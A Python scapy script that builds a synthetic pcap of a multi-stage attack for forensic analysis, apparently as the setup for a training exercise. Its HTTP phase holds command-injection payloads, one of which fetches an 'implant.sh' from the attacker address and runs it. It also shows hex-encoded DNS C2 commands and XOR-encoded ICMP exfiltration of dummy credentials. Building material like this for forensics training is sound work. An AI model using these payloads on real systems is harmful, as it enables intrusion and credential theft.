#!/usr/bin/env python3
"""
Generate a pcap containing a multi-stage network attack for forensic analysis.
Includes legitimate background traffic mixed with:
  Phase 1: TCP SYN port scan reconnaissance
  Phase 2: HTTP command injection exploitation
  Phase 3: DNS TXT-based C2 tunneling (hex-encoded)
  Phase 4: ICMP covert channel data exfiltration (XOR-encoded)
"""

import random
import struct
from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw,
    wrpcap, conf
)

conf.verb = 0
random.seed(42)

# ── Network layout ───────────────────────────────────────────
ATTACKER    = "10.13.37.100"
VICTIM      = "192.168.1.50"
DNS_SERVER  = "192.168.1.1"
EXFIL_RELAY = "10.13.37.200"
INT_HOST1   = "192.168.1.10"
INT_HOST2   = "192.168.1.20"
C2_DOMAIN   = "srv.update-check.net"
XOR_KEY     = b'\xd3\xa7\x5e\x11'
BASE_TIME   = 1700000000.0   # 2023-11-14 ~22:13 UTC

ETH = Ether(src="02:00:00:00:00:01", dst="02:00:00:00:00:02")

packets = []

def pkt(p, t):
    full = ETH / p
    full.time = t
    packets.append(full)

def xor_encode(data, key):
    if isinstance(data, str):
        data = data.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def rport():
    return random.randint(49152, 65535)

def rseq():
    return random.randint(1000, 60000)


# ═══════════════════════════════════════════════════════════════
# LEGITIMATE BACKGROUND TRAFFIC
# ═══════════════════════════════════════════════════════════════

# ── Normal DNS A queries ──────────────────────────────────────
for domain, src, offset in [
    ("www.google.com",      INT_HOST1, 0),
    ("github.com",          INT_HOST1, 45),
    ("ubuntu.com",          INT_HOST1, 90),
    ("cdn.jsdelivr.net",    INT_HOST1, 135),
    ("api.github.com",      INT_HOST2, 180),
    ("registry.npmjs.org",  INT_HOST2, 225),
]:
    t = BASE_TIME + offset + random.uniform(0, 5)
    qid, sp = random.randint(1, 65535), rport()
    pkt(IP(src=src, dst=DNS_SERVER) /
        UDP(sport=sp, dport=53) /
        DNS(id=qid, rd=1, qd=DNSQR(qname=domain, qtype="A")), t)
    pkt(IP(src=DNS_SERVER, dst=src) /
        UDP(sport=53, dport=sp) /
        DNS(id=qid, qr=1, rd=1, ra=1,
            qd=DNSQR(qname=domain, qtype="A"),
            an=DNSRR(rrname=domain, type="A",
                     rdata=f"93.184.{random.randint(1,254)}.{random.randint(1,254)}",
                     ttl=300)),
        t + 0.02)

# ── Normal ICMP pings (standard payload) ─────────────────────
for i in range(6):
    t = BASE_TIME + 60 + i * 35
    payload = struct.pack("!d", t) + bytes(range(0x10, 0x38))
    pkt(IP(src=INT_HOST1, dst=DNS_SERVER) /
        ICMP(type=8, id=0x1234, seq=i+1) / Raw(load=payload), t)
    pkt(IP(src=DNS_SERVER, dst=INT_HOST1) /
        ICMP(type=0, id=0x1234, seq=i+1) / Raw(load=payload), t + 0.005)

# ── Normal internal HTTP sessions ────────────────────────────
for i in range(3):
    t = BASE_TIME + 30 + i * 100
    sp = rport(); cs = rseq(); ss = rseq()
    pkt(IP(src=INT_HOST1, dst=INT_HOST2)/TCP(sport=sp, dport=80, flags='S', seq=cs), t)
    cs += 1
    pkt(IP(src=INT_HOST2, dst=INT_HOST1)/TCP(sport=80, dport=sp, flags='SA', seq=ss, ack=cs), t+0.002)
    ss += 1
    pkt(IP(src=INT_HOST1, dst=INT_HOST2)/TCP(sport=sp, dport=80, flags='A', seq=cs, ack=ss), t+0.003)
    req = b"GET /dashboard HTTP/1.1\r\nHost: 192.168.1.20\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    pkt(IP(src=INT_HOST1, dst=INT_HOST2)/TCP(sport=sp, dport=80, flags='PA', seq=cs, ack=ss)/Raw(load=req), t+0.01)
    cs += len(req)
    resp = b"HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\n<h1>Home</h1>"
    pkt(IP(src=INT_HOST2, dst=INT_HOST1)/TCP(sport=80, dport=sp, flags='PA', seq=ss, ack=cs)/Raw(load=resp), t+0.05)
    ss += len(resp)
    pkt(IP(src=INT_HOST1, dst=INT_HOST2)/TCP(sport=sp, dport=80, flags='A', seq=cs, ack=ss), t+0.06)

# ── Red herring: internal SSH connection (not the attacker) ──
t_ssh = BASE_TIME + 120
sp_ssh = rport()
pkt(IP(src=INT_HOST1, dst=VICTIM)/TCP(sport=sp_ssh, dport=22, flags='S', seq=rseq()), t_ssh)
pkt(IP(src=VICTIM, dst=INT_HOST1)/TCP(sport=22, dport=sp_ssh, flags='SA', seq=rseq(), ack=1), t_ssh+0.003)


# ═══════════════════════════════════════════════════════════════
# PHASE 1 — Reconnaissance: slow SYN scan  (T+180 → T+300)
# ═══════════════════════════════════════════════════════════════

SCAN_PORTS = [22, 80, 443, 3306, 5432, 8080, 8443, 9090]
OPEN_PORTS = {22, 8080}

for i, port in enumerate(SCAN_PORTS):
    t = BASE_TIME + 180 + i * 15 + random.uniform(0, 2)
    sp = rport(); seq = rseq()
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sp, dport=port, flags='S', seq=seq), t)
    if port in OPEN_PORTS:
        pkt(IP(src=VICTIM, dst=ATTACKER)/TCP(sport=port, dport=sp, flags='SA', seq=rseq(), ack=seq+1), t+0.005)
        pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sp, dport=port, flags='R', seq=seq+1), t+0.006)
    else:
        pkt(IP(src=VICTIM, dst=ATTACKER)/TCP(sport=port, dport=sp, flags='RA', seq=0, ack=seq+1), t+0.005)


# ═══════════════════════════════════════════════════════════════
# PHASE 2 — Exploitation: HTTP command injection  (T+360)
# ═══════════════════════════════════════════════════════════════

def http_session(sport, req_bytes, resp_bytes, ts):
    cs = rseq(); ss = rseq()
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='S', seq=cs), ts)
    cs += 1
    pkt(IP(src=VICTIM, dst=ATTACKER)/TCP(sport=8080, dport=sport, flags='SA', seq=ss, ack=cs), ts+0.003)
    ss += 1
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='A', seq=cs, ack=ss), ts+0.005)
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='PA', seq=cs, ack=ss)/Raw(load=req_bytes), ts+0.01)
    cs += len(req_bytes)
    pkt(IP(src=VICTIM, dst=ATTACKER)/TCP(sport=8080, dport=sport, flags='PA', seq=ss, ack=cs)/Raw(load=resp_bytes), ts+0.1)
    ss += len(resp_bytes)
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='A', seq=cs, ack=ss), ts+0.11)
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='FA', seq=cs, ack=ss), ts+0.5)
    cs += 1
    pkt(IP(src=VICTIM, dst=ATTACKER)/TCP(sport=8080, dport=sport, flags='FA', seq=ss, ack=cs), ts+0.51)
    ss += 1
    pkt(IP(src=ATTACKER, dst=VICTIM)/TCP(sport=sport, dport=8080, flags='A', seq=cs, ack=ss), ts+0.52)

def build_http_req(method, path, body=None):
    if body:
        return (f"{method} {path} HTTP/1.1\r\n"
                f"Host: 192.168.1.50:8080\r\n"
                f"User-Agent: curl/7.81.0\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n\r\n{body}").encode()
    return (f"{method} {path} HTTP/1.1\r\n"
            f"Host: 192.168.1.50:8080\r\n"
            f"User-Agent: curl/7.81.0\r\n"
            f"Accept: */*\r\n\r\n").encode()

def build_http_resp(body):
    return (f"HTTP/1.1 200 OK\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n{body}").encode()

http_exchanges = [
    # (method, path, body, response_body, sport, time_offset)
    ("GET", "/api/health", None,
     '{"status":"ok"}', 44001, 360),
    ("POST", "/api/query", "search=test",
     '{"results":["test_item"]}', 44002, 365),
    ("POST", "/api/query", "search=%3Bcat+%2Fetc%2Fpasswd",
     '{"results":["root:x:0:0:root:/root:/bin/bash","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"]}',
     44003, 375),
    ("POST", "/api/query", "search=%3Bid",
     '{"results":["uid=33(www-data) gid=33(www-data) groups=33(www-data)"]}',
     44004, 380),
    ("POST", "/api/query",
     "search=%3Bwget+http%3A%2F%2F10.13.37.100%3A4444%2Fimplant.sh+-O+%2Ftmp%2F.cache+%26%26+bash+%2Ftmp%2F.cache",
     '{"results":[""]}', 44005, 390),
]

for method, path, body, resp_body, sport, offset in http_exchanges:
    http_session(
        sport,
        build_http_req(method, path, body),
        build_http_resp(resp_body),
        BASE_TIME + offset
    )


# ═══════════════════════════════════════════════════════════════
# PHASE 3 — C2: DNS TXT tunneling with hex encoding  (T+450)
# ═══════════════════════════════════════════════════════════════

c2_exchanges = [
    # (victim_sends, c2_responds)
    ("webserver01:www-data",                     "CMD:id"),
    ("uid=33(www-data)",                         "CMD:cat /etc/crontab"),
    ("no crontab for www-data",                  "CMD:ls -la /home/"),
    ("admin deploy",                             "CFG:EXFIL:ICMP:10.13.37.200:d3a75e11"),
    ("ACK",                                      "CMD:HARVEST"),
]

for i, (query_data, response_data) in enumerate(c2_exchanges):
    t = BASE_TIME + 450 + i * 30
    query_hex = query_data.encode().hex()
    response_hex = response_data.encode().hex()
    c2_qname = f"{query_hex}.{C2_DOMAIN}"
    qid = random.randint(1, 65535)
    sp = rport()

    pkt(IP(src=VICTIM, dst=DNS_SERVER) /
        UDP(sport=sp, dport=53) /
        DNS(id=qid, rd=1, qd=DNSQR(qname=c2_qname, qtype="TXT")), t)

    pkt(IP(src=DNS_SERVER, dst=VICTIM) /
        UDP(sport=53, dport=sp) /
        DNS(id=qid, qr=1, aa=1, rd=1, ra=1,
            qd=DNSQR(qname=c2_qname, qtype="TXT"),
            an=DNSRR(rrname=c2_qname, type="TXT",
                     rdata=response_hex, ttl=60)),
        t + 0.1)

# Interspersed normal DNS from victim
for i, domain in enumerate(["apt.ubuntu.com", "security.ubuntu.com", "motd.ubuntu.com"]):
    t = BASE_TIME + 440 + i * 50
    qid = random.randint(1, 65535); sp = rport()
    pkt(IP(src=VICTIM, dst=DNS_SERVER) /
        UDP(sport=sp, dport=53) /
        DNS(id=qid, rd=1, qd=DNSQR(qname=domain, qtype="A")), t)
    pkt(IP(src=DNS_SERVER, dst=VICTIM) /
        UDP(sport=53, dport=sp) /
        DNS(id=qid, qr=1, rd=1, ra=1,
            qd=DNSQR(qname=domain, qtype="A"),
            an=DNSRR(rrname=domain, type="A",
                     rdata=f"91.189.{random.randint(1,254)}.{random.randint(1,254)}",
                     ttl=300)),
        t + 0.03)


# ═══════════════════════════════════════════════════════════════
# PHASE 4 — Exfiltration: ICMP covert channel  (T+620)
# ═══════════════════════════════════════════════════════════════

EXFIL_LINES = [
    "CREDENTIALS_DUMP_v2",
    "admin:SuperS3cretP@ss!",
    "dbuser:MySQL_R00t_2024#",
    "deploy:CI_CD_t0ken_X9f2",
    "svc_backup:Bkup_key_7Hj$mN",
    "root_token:vault_s.X8k2mNpQ9rT1wV",
    "END_DUMP",
]

for i, line in enumerate(EXFIL_LINES):
    t = BASE_TIME + 620 + i * 8
    encoded = xor_encode(line, XOR_KEY)
    pkt(IP(src=VICTIM, dst=EXFIL_RELAY) /
        ICMP(type=8, code=0, id=0xBEEF, seq=i+1) / Raw(load=encoded), t)
    pkt(IP(src=EXFIL_RELAY, dst=VICTIM) /
        ICMP(type=0, code=0, id=0xBEEF, seq=i+1) / Raw(load=b'\x00' * 4), t+0.05)


# ═══════════════════════════════════════════════════════════════
# Write pcap
# ═══════════════════════════════════════════════════════════════

packets.sort(key=lambda p: float(p.time))
wrpcap("/build/incident.pcap", packets)
print(f"Generated incident.pcap with {len(packets)} packets")
